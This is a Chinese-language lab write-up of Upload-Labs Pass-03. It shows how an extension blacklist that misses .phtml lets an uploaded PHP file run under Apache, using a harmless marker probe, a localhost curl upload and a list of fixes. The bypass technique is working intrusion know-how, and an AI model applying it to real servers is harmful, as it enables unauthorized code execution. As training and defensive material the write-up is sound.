Upload-Labs Pass-03：黑名单遗漏 .phtml 解析扩展名

Upload-Labs Web File Upload PHP Apache

Pass-03 只把 .asp、.aspx、.php、.jsp 放进黑名单。程序会转小写、去尾随点、去除 ::$DATA 并去空格，但最终仍把客户端扩展名拼到随机文件名后。Apache 的 PHP 模块同时处理 .phtml，因此黑名单遗漏可以直接转化为脚本执行。

验证状态：本机 PHP 8.4.24 + Apache 2.4.68 下上传 .phtml 成功，访问后返回 SAFE_MARKER_OK。

一、源码判断

$deny_ext = array('.asp','.aspx','.php','.jsp');
$file_name = deldot(trim($_FILES['upload_file']['name']));
$file_ext = strtolower(strrchr($file_name, '.'));
$file_ext = trim(str_ireplace('::$DATA', '', $file_ext));

if (!in_array($file_ext, $deny_ext)) {
    $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path);
}

这里处理的是“扩展名是否在四个字符串中”，不是“扩展名是否属于安全白名单”。.phtml 不在数组中，但 Apache 的 libphp8.4.so 配置会匹配 \.ph(?:ar|p|tml)$。

二、复现请求

探针只输出固定文本，不读取参数，也不执行系统命令：

<?php echo "SAFE_MARKER_OK"; ?>

通过 curl 把上传文件名覆盖成 pass03_probe.phtml：

curl.exe -sS \
  -F "upload_file=@safe-marker.txt;filename=pass03_probe.phtml;type=application/octet-stream" \
  -F "submit=上传" \
  "http://127.0.0.1:8081/Pass-03/index.php"

响应给出了形如 202611081138409469.phtml 的随机文件名。访问该路径时，HTTP 200 响应正文为：

SAFE_MARKER_OK

三、根因与影响

根因是服务端使用可执行扩展名黑名单，而解释器实际接受的扩展名集合更大。随机文件名只能防止覆盖，不能阻止随机名最后的 .phtml 被 Apache 交给 PHP。只要上传目录可写且可访问，文件上传就能进一步形成代码执行。

四、修复建议

  • 使用安全扩展名白名单，并围绕最终保存名执行校验。
  • 由服务端生成随机名和固定图片后缀，不接受客户端扩展名。
  • 检查真实文件内容，并对图片重新解码、编码。
  • 把上传目录移出 Web 根目录，或在 Web 服务器层关闭脚本执行。

五、复盘

Pass-03 的关键不是某个参数异常，而是“应用认为不可执行的后缀”和“Apache 实际会解析的后缀”之间的集合差。验证时要分别记录上传成功、文件可访问和 PHP 实际执行三个阶段。
